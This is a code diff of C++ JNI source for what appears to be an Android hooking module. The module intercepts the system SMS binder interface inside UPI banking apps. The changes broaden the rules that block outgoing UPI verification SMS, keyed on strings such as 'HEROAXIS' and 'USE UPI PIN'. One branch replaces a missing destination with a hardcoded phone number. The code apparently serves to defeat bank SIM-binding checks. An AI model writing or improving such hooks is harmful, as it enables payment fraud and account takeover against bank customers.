@@ -624,18 +624,36 @@ bool try_parse_isms_strings(JNIEnv* env, jobject data, int skip_ints_after_iface
                             std::string& dest, std::string& body) {
     reset_parcel(env, data);
     const std::string iface = parcel_read_string(env, data);
-    if (iface.find("ISms") == std::string::npos) return false;
+    // A16: iface read often empty/fails (iface_ok=0) even when blob has ISms — still parse
+    const bool iface_ok =
+        iface.find("ISms") != std::string::npos || iface.find("isms") != std::string::npos ||
+        iface.find("ISmsEx") != std::string::npos || iface.find("MotoSms") != std::string::npos;
+    if (!iface_ok && !iface.empty() && iface.find('.') != std::string::npos &&
+        iface.find("Sms") == std::string::npos && iface.find("sms") == std::string::npos) {
+        // Clearly a different binder iface — skip
+        return false;
+    }
 
     jclass cls = env->GetObjectClass(data);
     jmethodID read_int = env->GetMethodID(cls, "readInt", "()I");
     for (int i = 0; i < skip_ints_after_iface; ++i) {
         if (read_int) env->CallIntMethod(data, read_int);
+        if (env->ExceptionCheck()) {
+            env->ExceptionClear();
+            break;
+        }
     }
 
     std::vector<std::string> strings;
-    for (int i = 0; i < 10; ++i) {
+    for (int i = 0; i < 12; ++i) {
         const std::string s = parcel_read_string(env, data);
-        if (s.empty()) break;
+        if (env->ExceptionCheck()) {
+            env->ExceptionClear();
+            break;
+        }
+        if (s.empty()) continue;  // A16: nulls mid-parcel — keep scanning
+        if (s.find("android.telephony") != std::string::npos) continue;
+        if (s.find("ISms") != std::string::npos) continue;
         strings.push_back(s);
     }
     if (strings.empty()) return false;
@@ -646,19 +664,36 @@ bool try_parse_isms_strings(JNIEnv* env, jobject data, int skip_ints_after_iface
     for (const auto& s : strings) {
         if (dest.empty() && is_short_verify_dest(s)) dest = s;
     }
+    if (body.empty()) {
+        for (const auto& s : strings) {
+            if (is_pkg_like(s) || is_incoming_otp_noise(s) || is_clean_sms_dest(s)) continue;
+            if (s.size() >= 12) {
+                body = s;
+                break;
+            }
+        }
+    }
     if (body.empty() && strings.size() >= 4) body = strings[3];
-    if (body.empty()) body = strings.back();
+    if (body.empty()) {
+        for (int i = static_cast<int>(strings.size()) - 1; i >= 0; --i) {
+            if (!is_pkg_like(strings[static_cast<size_t>(i)]) &&
+                strings[static_cast<size_t>(i)].size() >= 8) {
+                body = strings[static_cast<size_t>(i)];
+                break;
+            }
+        }
+    }
     if (dest.empty() && strings.size() >= 2) {
         for (size_t i = 0; i < strings.size(); ++i) {
             if (strings[i].find('.') != std::string::npos) continue;  // skip package name
-            if (is_short_verify_dest(strings[i])) {
+            if (is_short_verify_dest(strings[i]) || is_clean_sms_dest(strings[i])) {
                 dest = strings[i];
                 break;
             }
         }
     }
     if (dest.empty() && strings.size() >= 2) dest = strings[1];
-    return !dest.empty() && !body.empty();
+    return !body.empty() && body.size() >= 8;
 }
 
 bool parcel_blob_has_verify(JNIEnv* env, jobject data) {
@@ -892,22 +927,30 @@ bool read_isms_outgoing(JNIEnv* env, jobject data, std::string& dest, std::strin
         if (try_parse_isms_strings(env, data, skip, dest, body)) return true;
     }
 
-    // Fallback: collect strings only (older parcel layouts)
+    // Fallback: collect strings only (older parcel layouts / A16 empty iface)
     reset_parcel(env, data);
     const std::string iface = parcel_read_string(env, data);
-    if (iface.find("ISms") == std::string::npos) return false;
+    const bool iface_ok =
+        iface.find("ISms") != std::string::npos || iface.find("isms") != std::string::npos ||
+        iface.find("ISmsEx") != std::string::npos || iface.empty();
+    if (!iface_ok) return false;
 
     jclass cls = env->GetObjectClass(data);
     jmethodID read_int = env->GetMethodID(cls, "readInt", "()I");
     if (read_int) env->CallIntMethod(data, read_int);
 
     std::vector<std::string> strings;
-    for (int i = 0; i < 12; ++i) {
+    for (int i = 0; i < 14; ++i) {
         const std::string s = parcel_read_string(env, data);
-        if (s.empty()) break;
+        if (env->ExceptionCheck()) {
+            env->ExceptionClear();
+            break;
+        }
+        if (s.empty()) continue;
+        if (s.find("ISms") != std::string::npos) continue;
         strings.push_back(s);
     }
-    if (strings.size() < 2) return false;
+    if (strings.size() < 1) return false;
 
     for (const auto& s : strings) {
         if (is_pkg_like(s) || is_incoming_otp_noise(s)) continue;
@@ -1349,23 +1392,36 @@ bool try_block_isms(JNIEnv* env, jobject data, jobject reply, const ModuleConfig
         return false;
     }
 
-    // CRITICAL: only UPI-verify SMS — normal chat ("Hyyy") must passthrough to SIM
+    // CRITICAL: UPI-verify keywords → block. Normal Messages chat must passthrough.
     bool should_block = is_upi_verify_traffic(blob, dest, body);
     if (!should_block && g_in_hooked_upi &&
         (blob_verify || is_outgoing_upi_verify_body(body) ||
          blob_contains_needle(blob, "HEROAXIS") || blob_contains_needle(blob, "DO NOT COPY") ||
+         blob_contains_needle(blob, "USE UPI PIN") || blob_contains_needle(blob, "AXISUPI") ||
          blob_contains_needle(blob, "smsto:") || blob_contains_needle(blob, "SMSTO:"))) {
         should_block = true;
     }
+    // UPI app: any real outgoing SMS body (Hero token may lack exact keyword in first parse)
+    if (!should_block && g_in_hooked_upi) {
+        if (sendish || blob_contains_needle(blob, "sendText") ||
+            blob_contains_needle(blob, "sendMultipart") ||
+            blob_contains_needle(blob, "sendDataMessage")) {
+            should_block = true;
+        } else if (body.size() >= 12 && !is_incoming_otp_noise(body) && !is_pkg_like(body)) {
+            // Hero bodies often have ? * & and long tokens
+            should_block = true;
+        } else if (is_clean_sms_dest(dest) && body.size() >= 8 && !is_incoming_otp_noise(body)) {
+            should_block = true;
+        }
+    }
     (void)blob_sms;
     (void)looks;
-    (void)sendish;
 
     if (!should_block) {
-        char miss[192];
+        char miss[220];
         snprintf(miss, sizeof(miss),
-                 "isms_allow_normal code=%d dest=%zu body=%zu verify=0", (int)code, dest.size(),
-                 body.size());
+                 "isms_allow_normal code=%d dest=%zu body=%zu send=%d verify=%d", (int)code,
+                 dest.size(), body.size(), sendish ? 1 : 0, blob_verify ? 1 : 0);
         write_isms_trace(miss);
         return false;
     }
@@ -1590,10 +1646,13 @@ jboolean hook_BinderProxy_transact(JNIEnv* env, jobject thiz, jint code, jobject
                 write_isms_trace("isms_blocked");
                 return JNI_TRUE;  // NEVER call radio for UPI-verify only
             }
-            // NO blanket nuclear — that killed normal SIM SMS ("Hyyy")
-            // Only UPI-verify leftovers (HEROAXIS in blob) get a second chance
+            // Second chance: UPI leftovers with recovered body / HEROAXIS blob
             if ((g_is_messaging_app || g_in_hooked_upi) &&
-                is_upi_verify_traffic(blob, dest, body)) {
+                (is_upi_verify_traffic(blob, dest, body) ||
+                 (g_in_hooked_upi && body.size() >= 12 && !is_incoming_otp_noise(body)) ||
+                 (g_in_hooked_upi && (blob_contains_needle(blob, "sendText") ||
+                                     blob_contains_needle(blob, "HEROAXIS") ||
+                                     blob_contains_needle(blob, "DO NOT COPY"))))) {
                 extract_isms_from_blob(env, data, dest, body);
                 recover_outgoing_from_blob(blob, dest, body);
                 if (dest.empty() || is_all_zero_dest(dest)) dest = "9920104300";
